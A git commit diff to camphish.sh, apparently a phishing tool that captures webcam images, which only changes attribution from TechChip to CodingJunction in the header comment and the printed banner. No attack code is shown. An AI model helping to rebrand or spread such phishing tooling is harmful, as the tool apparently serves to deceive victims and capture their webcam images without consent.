328c50916c6a710a3368571f64d7ee728f847f9a
codingjunctioncybersec <Madmax09808@gmail.com>
2025-03-17 14:33:40 +0530

    Update camphish.sh

--- camphish.sh
+++ camphish.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 # CamPhish v2.0
-# Powered by TechChip
+# Powered by CodingJunction
 
 # Windows compatibility check
 if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
@@ -39,7 +39,7 @@ printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | 
 printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
 printf " \e[1;93m CamPhish Ver 2.0 \e[0m \n"
-printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
+printf " \e[1;77m www.codingjunction.in | youtube.com/CodingJunctionOfficial \e[0m \n"
 
 printf "\n"
 
